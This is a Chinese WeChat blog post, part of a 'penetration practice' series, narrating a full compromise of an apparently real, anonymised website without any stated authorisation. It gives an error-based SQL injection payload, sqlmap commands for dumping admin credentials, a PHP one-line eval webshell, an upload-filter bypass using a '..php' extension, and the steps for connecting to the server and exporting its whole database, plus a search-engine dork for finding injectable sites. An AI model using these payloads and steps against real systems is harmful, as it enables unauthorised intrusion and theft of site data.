> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HPSbhX9aFf5vNMdnZKxSiw)

![](https://mmbiz.qpic.cn/mmbiz_png/yv5xg29CADoqaxxZZFXJRfP8Sd0wCXgy21McgQ6Rsg6XvJGyZagbEXfjT24AzcMYEdALo2jDRODv3cWkbiaFibcw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaAkcXYjGFibvhEib9Fr7OicyeoEI1ya3AFaqyn5mK59V4OzgmXRyhN6Y1HGQv8WdrQfEMuXZZbgJmWw/640?wx_fmt=gif)

    因工作需要，封闭了一周，公众号一周未更新，今天终于解放，继续分享 web 渗透实战经验。**常学常新，慢就是快**。  

    本实战案例非常适合练手，从 sql 注入、后台管理员登录、上传绕过、webshell、服务器权限，一套完成的渗透流程。  

    后续将会对此站做**后渗透测试**。  

    本文章技术仅用于渗透安全测试**。**  

**涉及知识点：**

```
1、寻找注入点
2、寻找管理后台，目录扫描（dirmap）
3、寻找管理后台，扫描子域名（sublist3r 扫描到了子域名，找到后台）
4、sqlmap注入，获取管理员账号并解密
5、上传绕过，网站管理后台找到文件上传点（..php,后台过滤了.php）
6、蚁剑连接后查到到数据库文件，连接数据库连接成功
7、上传可以大马adminer.php（类似phpmyadmin可以直接连数据库）导出数据
```

**01**

寻找注入点  

  

网址 http://xx.xx.xx/

网站点击功能菜单跳转 http://xx.xx.xx/xx.php?pkey=6

在参数 6 后加上下引号，测试是否存在注入点

 http://xx.xx.xx/xx.php?pkey=6’ 

有回显报错

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJc6TLPkFrxTmAHouzUvKqkKMCTmgW4exkOVXnAa8XMTzVMkIWqfgDv0Q/640?wx_fmt=png)

```
Invalid query: You have an error in your SQL syntax;
 check the manual that corresponds to your MySQL 
 server version for the right syntax to use near ''6''' at line 7
```

用 updatexml 做报错注入测试

```
http://xx.xx.xx/xx.php?pkey=6%27%20
and%20updatexml(1,concat(0x3a,(select%20database())),1)%23
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcrG1gCmoqASTfy246uNsFK1sVkaLdmJL77kOrlsHTibSKhibgm8nlAJJA/640?wx_fmt=png)

回显数据库：

```
Invalid query: XPATH syntax error: ':lbwzbm'
```

证明存在注入，而且未发现过滤

**02**

Dirmap 目录扫描  

  

Dirmap.py 扫描网站目录，寻找管理页面入口，未发现

```
python3 dirmap.py -i http://xx.xx.xx/ -lcf
```

**03**

Sublist3r 域名扫描  

  

Sublist3r.py 扫描网站域名，寻找管理页面入口，未发现

```
python2 Sublist3r.py -d xx.xx.xx -o 12.txt
```

结果

```
www.xx.xx.xx
cms.xx.xx.xx
cpanel.xx.xx.xx
cpcalendars.xx.xx.xx
cpcontacts.xx.xx.xx
library.xx.xx.xx
mail.xx.xx.xx
record.xx.xx.xx
webdisk.xx.xx.xx
webmail.xx.xx.xx
```

推断、试验后：cms.xx.xx.xx 为管理页面

输入 http:// cms.xx.xx.xx 跳转到

https://yy.yy.yy.yy /yy/login.php

打开后登录页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJc6WzLZhyVduebpXhVodZP33z44X9bQqIoWJfzluXteGsER3FjuwlHcQ/640?wx_fmt=png)

**04**

sqlmap 注入  

上文网站注入点已经通过手动找到，如果通过手动注入不现实，而且不一定能成功，所以这里用注入神器 sqlmap 跑起来。

本地 windows 下跑 sqlmap(本地网不稳定，容易中断，建议可以用在 VPS 上做 sql 注入，更安全更稳定) 

为了手机里方便看，命令我做了换行

跑用户

```
python2 sqlmap.py -u http://xx.xx.xx/xx.php?pkey=6  
 --technique=BE --current-user
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJc8ick34TQ5zvQs9Y6y8DLutrQEibqDpFnup2rTeTH3TUPOCiayQibXIp8LQ/640?wx_fmt=png)

爆库

```
python2 sqlmap.py -u http://xx.xx.xx/xx.php?pkey=6  
--technique=BE --current-db
```

爆表

```
python2 sqlmap.py -u http://xx.xx.xx/xx.php?pkey=6  
--technique=BE -D kauyan –tables
```

爆字段

```
python2 sqlmap.py -u http://xx.xx.xx/xx.php?pkey=6  
--technique=BE -D xx -T xx –columns
```

爆数据（login 登录账号，pwd 密码 md5 加密，user_group 用户组管理员值为 admin）

```
python2.7 sqlmap.py -u http://xx.xx.xx/xx.php?pkey=6  
--technique=E -D xx -T xx -C login,pwd,pkey,user_group –dump
```

数据

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcPX5DOzVfq3D16OMIljI3e7hYwowaXxjVrQJxdKwb1ONAiaXSqsIyKuA/640?wx_fmt=png)

密码是 md5 加密，需要解密（此处是付费解密的） 

解密后获得密码明文

注意需要找到用户为管理组（admin）的用户，这样才有管理员权限  

在 vps 上跑 sqlmap 不易中断，速度较快

设置参数后，效率会大大增加

```
--current-db
--current-user
--is-dba 是否是dba
--threads=3 开3个进程
--batch 批量执行默认选项
–random-agent  使用随机选定的User-Agent头
```

**06**

登录后台，木马上传

登录页面 https://yy.yy.yy.yy/yy/login.php

用 sqlmap 注入获取的用户名, 密码输入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcY6F74wmhvZSvt78WhkXRibJJDCnJzWSQ4FaAb26oTOfKpQlCib5WXwaQ/640?wx_fmt=png)

进入后台管理页面

https:// yy.yy.yy.yy/yy /user.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcpqkoia9ER4TVloFpHKOfcdr9DXThuW8xXrzfsvC6o9foBVLD1zmP77g/640?wx_fmt=png)

系统管理 - 文件管理 - 新增 找到上传点

 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcQnVNwSNble8XAMhE83g5W6KjeGYzrn0rKbQlf82a6Y4bxiaITDqOzEg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcJdEnBbDog6R9fCf6e14yAhxXGsPGibdyLEBZ3aVEoicS7U3ibI46SarKA/640?wx_fmt=png)

**上传一句话小马**

**上传一句话小马**（或者大马）

先上传小马 zmg.php

```
<?php @eval($_POST['xyz']); ?>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcfccrh0HxR7DT71oZtXdpmZJBicGHNg6gsy5fCNmDygUqgl0YibQiaKnAw/640?wx_fmt=png)

上传后返回 1348_1.php_ 证明上传后扩展名被过滤处理了，

上传无提示说明是黑名单过滤，尝试各种过滤方法

**尝试后缀名为 “..php” 进行上传，成功（关键点上传绕过）**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcLuqU2o6W1szjlY93lWszTe1ad4Dy22hyrUfXpbnBWtqk2uhiakWCgWA/640?wx_fmt=png)

访问，证明上传成功

中国蚁剑连接小马，连接成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcP4WjoCr3rp6icwJW6AOtdRZUmPWRMfibVLHUt2jTTH4j2P6RsDyHnhLw/640?wx_fmt=png)

寻找找到网站数据库配置文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcJT25pjLibOadtnB1q7RvJTGbfxWokj1ibTScic6RgFV2Yx8rssIjehBMg/640?wx_fmt=png)

_conn.php 推断或为数据库连接文件，打开果然是

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJc4T8d3I4pXrzm1gibVz3oAZbYaCddFgXUIbiaRfxiaiaJwVu6icmVialvqhkQ/640?wx_fmt=png)

中国蚁剑连接后台数据库（也可以上传带数据库管理功能的大马进行连接数据库）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcpJCCVvIrhtT3ibFf0FjZH16FgNB0xEbZzMLicQ66jqjjr7EsxR4nlTqg/640?wx_fmt=png)

查看到所有数据

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcnn14cTyW222LFMc4jgswwVibajHjBuQoCiabloXlqjGYKhtC6RQK8SiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJc9njtsmg4ymud67HKRwDibgxmMyYd4mAsTqdhbasrdSqkZQicherAHx3g/640?wx_fmt=png)

可以导出数据

上传大马  

可以在网站上传点上传，或者蚁剑上传  

php 大马 adminer.php 功能 mysql 数据库管理  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcUH91Qf9azUCb0nZm1eDWYZcpKCwdvEhGbYFE8CgCiarL6Ot8r3GVlcQ/640?wx_fmt=png)

http://www.xx.xx.xx/filedata/tbl_cms_doc/doc/1311_1..php

进入类似 phpmyadmin.php 数据库管理页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONS790Z6WjIav104urbNWjJcbISJGYPylf8BgPRE9YmzkWLvCibN9NSticia599cCkXaLCers3qxaoFNw/640?wx_fmt=png)

登录成功，可以任意导出数据。  

**至此 web 渗透已经全部完成，网站后台管理、数据库库、服务器权限均成功获取。**

小知识点：

新手可以通过谷歌语法：site: php?id= ，然后进行注入点寻找

然后进行漏洞实验，切记要安全、合法。

**推荐阅读：**

  

_**WEB 渗透实战系列**_

  

  

▶[【渗透实战系列】|8 - 记一次渗透测试从 XSS 到 Getshell 过程（详细到无语）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486005&idx=3&sn=55aad92a300e5a6410aa194b521e11b2&chksm=ce67a0acf91029ba5cd51fbe7c5682fd3eab8a257cf1f6bae44fdaa871bbac7edd51440e4cf8&scene=21#wechat_redirect)

▶[【渗透实战系列】|7 - 记一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485901&idx=1&sn=84b5dac005c838c1b6d22fc4207c81c1&chksm=ce67a354f9102a42260468d305734ed7ea437715ee508f2b3eeb8afa0727b7f4ae652909ff44&scene=21#wechat_redirect)

▶[【渗透实战系列】|6- BC 杀猪盘渗透一条龙 (文末附【渗透实战系列】其他文章链接)](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485861&idx=1&sn=39318b76da490ed2a8746134f685d454&chksm=ce67a33cf9102a2aa3793cafbd701c77f851ca9dac3f827524b5cfe093cbecb14892ee131400&scene=21#wechat_redirect)

▶[【渗透实战系列】|5 - 记一次内衣网站渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485826&idx=2&sn=8f11b7cc12f6c5dfb5eeeb316f14f460&chksm=ce67a31bf9102a0d704877584dc3c49141a376cc1b35c0659f3ae72baa7e77e6de7e0f916db5&scene=21#wechat_redirect)

▶[【渗透实战系列】|4 - 看我如何拿下 BC 站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485789&idx=2&sn=a1a3c9fc97eeab0b5e5bd3d311e3fae6&chksm=ce67a3c4f9102ad21ce5c895d364b4d094391d2369edfc3afce63ed0b155f8db1c86fa6924f1&scene=21#wechat_redirect)  

▶[【渗透实战系列】|3 - 一次简单的渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485778&idx=2&sn=997ecdc137f7ae88737e827b29db4e45&chksm=ce67a3cbf9102add52833faf5ad7346affc93589fc8babf72468997c2dbd88c25e8f06d8a7e0&scene=21#wechat_redirect)

▶[【渗透实战系列】|2 - 记一次后门爆破到提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485647&idx=2&sn=28a227ff21a6a99e323f6e27130a5ad5&chksm=ce67a256f9102b4030db2fc636ff1d454d46178fc2003368305cdc06ae2a4c81dd011dfcb361&scene=21#wechat_redirect)

▶[【渗透实战系列】|1 一次对跨境赌博类 APP 的渗透实战（getshell 并获得全部数据）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485589&idx=1&sn=f4f64ea923675c425f1de9e4e287fb07&chksm=ce67a20cf9102b1a1a171041745bd7c243156eaee575b444acc62d325e2cd2d9f72b2779cf01&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONSgp1TKd5oeaGb76g5eMFibnANHNp30ic7NtpVnU12TNkBynw2ju7RDHbYtVZibm5rjDh7VKbAEyO8ZQ/640?wx_fmt=jpeg)  

**长按 - 识别 - 关注**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONRHbDcqVCY8LR0Y5uDpRzUdh4kN8gRTPLYhNib2rHTJFT9cJ77DRe7tbyjP3mfuRk0P8PKPqdWUbkw/640?wx_fmt=jpeg)

**Hacking 黑白红**

一个专注信息安全技术的学习平台

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBDEU5hJAFfap4mBBAnI4BIic2GAuYgDwUzqwIb9wicGiaCyopAyJEKapgA/640?wx_fmt=gif)

**点分享**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBRJ4tRlk9QKMxMAMticVia5ia8bcewCtM3W67zSrFPyjHuSKmeESESE1Ig/640?wx_fmt=gif)

**点收藏**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBnTO2pb7hEqNd7bAykePEibP0Xw7mJTJ7JnFkHuQR9vHE7tNJyHIibodA/640?wx_fmt=gif)

**点点赞**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBhibuWXia5pNqBfUReATI6GO6sYibzMvj8ibQM6rOo2ULshCrbaM0mJYEqw/640?wx_fmt=gif)

**点在看**